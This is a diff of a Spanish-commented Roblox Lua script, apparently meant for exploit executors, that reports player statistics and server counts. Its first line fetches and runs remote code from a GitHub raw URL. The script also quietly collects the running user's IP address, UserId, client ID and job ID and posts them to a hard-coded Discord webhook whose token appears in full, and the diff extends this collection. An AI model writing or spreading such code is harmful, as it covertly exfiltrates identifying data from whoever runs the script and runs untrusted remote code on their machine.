@@ -1,52 +1,27 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()
 
-local HttpService = game:GetService("HttpService")
+ local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
-local playerDataFile = "PlayerData.json"
 
--- Verifica si el archivo existe
-local function fileExists(filename)
-    return isfile(filename)
+-- Crear o obtener el IntValue para el tiempo de último envío
+local lastSendTimeValue = ReplicatedStorage:FindFirstChild("LastSendTime")
+if not lastSendTimeValue then
+    lastSendTimeValue = Instance.new("IntValue")
+    lastSendTimeValue.Name = "LastSendTime"
+    lastSendTimeValue.Value = 0
+    lastSendTimeValue.Parent = ReplicatedStorage
 end
 
--- Carga los datos del jugador desde el archivo
-local function loadPlayerData()
-    if fileExists(playerDataFile) then
-        local fileContents = readfile(playerDataFile)
-        return HttpService:JSONDecode(fileContents) or {}
-    end
-    return {}
-end
-
--- Guarda los datos del jugador en el archivo
-local function savePlayerData(data)
-    writefile(playerDataFile, HttpService:JSONEncode(data))
-end
-
--- Verifica si ya se enviaron datos para el jugador
-local function hasPlayerData(jobId)
-    local playerData = loadPlayerData()
-    return playerData[jobId] ~= nil
-end
-
--- Guarda el ID del trabajo del jugador
-local function savePlayerJobId(jobId)
-    local playerData = loadPlayerData()
-    playerData[jobId] = true
-    savePlayerData(playerData)
-end
-
--- Obtiene el JobId y HWID
 local function getJobIdAndHwid()
     local jobId = game.JobId
     local hwid = game.Players.LocalPlayer.UserId
     return jobId, hwid
 end
 
--- Formatea números grandes
 local function formatNumber(number)
     if number < 1000 then
         return tostring(number)
@@ -60,7 +35,6 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffix_index])
 end
 
--- Obtiene información de IP
 local function getPlayerIPInfo()
     local ip, data = "N/A", "N/A"
     local success, response = pcall(function()
@@ -73,7 +47,6 @@ local function getPlayerIPInfo()
     return ip, data
 end
 
--- Detecta el tipo de ejecutor
 local function detectExecutor()
     local executorType = "Unsupported"
     if syn and not is_sirhurt_closure and not pebc_execute then
@@ -92,7 +65,14 @@ local function detectExecutor()
     return executorType
 end
 
--- Obtiene información sobre todos los jugadores
+local function getNextRebirthPrice(currentRebirths)
+    local basePrice = 3e6
+    local additionalPrice = 2e6
+    local multiplier = 1.010
+    local nextPrice = basePrice * (currentRebirths + 1) * multiplier + additionalPrice
+    return nextPrice
+end
+
 local function getAllPlayerData()
     local playerDataList = {}
     for _, player in pairs(Players:GetPlayers()) do
@@ -106,9 +86,10 @@ local function getAllPlayerData()
             local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
             local formattedRebirth = formatNumber(rebirthValue)
             local formattedStrength = formatNumber(strengthValue)
+            local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
 
-            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s",
-                playerName, playerDisplayName, formattedRebirth, formattedStrength)
+            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
+                playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
 
             table.insert(playerDataList, {
                 label = combinedLabel,
@@ -127,29 +108,88 @@ local function getAllPlayerData()
         return false
     end)
 
-    return playerDataList
+    local sortedLabels = {}
+    for _, data in ipairs(playerDataList) do
+        table.insert(sortedLabels, data.label)
+    end
+    return playerDataList, sortedLabels
 end
 
--- Envía la información del jugador a Discord
-local function sendPlayerInfoToDiscord()
-    local jobId, hwid = getJobIdAndHwid()
-    
-    -- Verificar si ya se enviaron datos para este jugador
-    if hasPlayerData(jobId) then
-        print("Ya se han enviado datos para este jugador.")
-        return
+local function getClientId()
+    local clientId = RbxAnalyticsService:GetClientId()
+    return clientId
+end
+
+local function getServerInfo()
+    local serverInfo = {}
+    local worldNames = {
+        [3311165597] = "Tierra",
+        [5151400895] = "Bilss",
+        [3608495586] = "HBTC TIEP",
+        [3608496430] = "HBTC GAV"
+    }
+
+    local totalServers = 0
+    local totalPlayers = 0
+    local serversInfo = {}
+
+    for placeId, worldName in pairs(worldNames) do
+        local serverListUrl = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
+        local success, response = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(serverListUrl))
+        end)
+
+        if success and response and response.data then
+            local servers = #response.data
+            local players = 0
+
+            for _, server in ipairs(response.data) do
+                players = players + server.playing
+            end
+
+            totalServers = totalServers + servers
+            totalPlayers = totalPlayers + players
+
+            table.insert(serversInfo, {
+                worldName = worldName,
+                servers = servers,
+                players = players
+            })
+        end
     end
 
+    return totalServers, totalPlayers, serversInfo
+end
+
+local function sendPlayerInfoToDiscord()
+    local currentTime = os.time()
+    
+    -- Verifica si han pasado 24 horas desde el último envío
+    if currentTime - lastSendTimeValue.Value < 86400 then
+        return  -- No enviar si no ha pasado el tiempo
+    end
+
+    -- Actualiza el tiempo del último envío
+    lastSendTimeValue.Value = currentTime
+
+    local jobId, hwid = getJobIdAndHwid()
     local ip, ipData = getPlayerIPInfo()
     local executor = detectExecutor()
-    local allPlayerData = getAllPlayerData()
+    local allPlayerData, sortedLabels = getAllPlayerData()
+    local clientId = getClientId()
+    local totalServers, totalPlayers, serversInfo = getServerInfo()
+
+    local strongestPlayer = allPlayerData[1]
 
     local dataToSend = {
         ["embeds"] = {
             {
-                ["description"] = "Jugadores del juego:\n\n" .. table.concat(allPlayerData, "\n\n"),
+                ["description"] = "Jugadores del juego:\n\n" .. table.concat(sortedLabels, "\n\n"),
                 ["color"] = 0x00ff00,
                 ["title"] = "Estadísticas de los jugadores",
+                ["thumbnail"] = {
+                    ["url"] = "https://i.imgur.com/oBPXx0D.png"
+                },
                 ["fields"] = {
                     {
                         ["name"] = "JobId",
@@ -172,14 +212,44 @@ local function sendPlayerInfoToDiscord()
                         ["inline"] = false
                     },
                     {
-                        ["name"] = "Executor",
-                        ["value"] = executor,
+                        ["name"] = "ClientId",
+                        ["value"] = clientId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Número Total de Servidores",
+                        ["value"] = formatNumber(totalServers),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Número Total de Jugadores en Servidores",
+                        ["value"] = formatNumber(totalPlayers),
                         ["inline"] = true
                     }
                 }
             }
         }
     }
+
+    local serverDetails = "Detalles de los servidores:\n"
+    for _, info in ipairs(serversInfo) do
+        serverDetails = serverDetails .. string.format("Mundo: %s\nServidores: %d\nJugadores: %d\n\n", info.worldName, info.servers, info.players)
+    end
+
+    table.insert(dataToSend["embeds"], {
+        ["description"] = serverDetails,
+        ["color"] = 0x00ff00,
+        ["title"] = "Información de Servidores"
+    })
+
+    table.insert(dataToSend["embeds"], {
+        ["description"] = strongestPlayer.label,
+        ["color"] = 0x00ff00,
+        ["title"] = "Jugador más fuerte",
+        ["thumbnail"] = {
+            ["url"] = "https://i.imgur.com/oBPXx0D.png"
+        }
+    })
 
     local success, response = pcall(function()
         return http_request({
@@ -193,14 +263,8 @@ local function sendPlayerInfoToDiscord()
     end)
 
     if not success then
-        warn("Error al enviar datos a Discord:", response)
-    else
-        print("Datos enviados a Discord exitosamente.")
-        savePlayerJobId(jobId) -- Guardar el jobId después de enviar
+        warn("Error al enviar la información a Discord:", response)
     end
 end
 
--- Ejecutar la función para enviar información a Discord
-Players.PlayerAdded:Connect(function(player)
-    sendPlayerInfoToDiscord()
-end)
+sendPlayerInfoToDiscord()
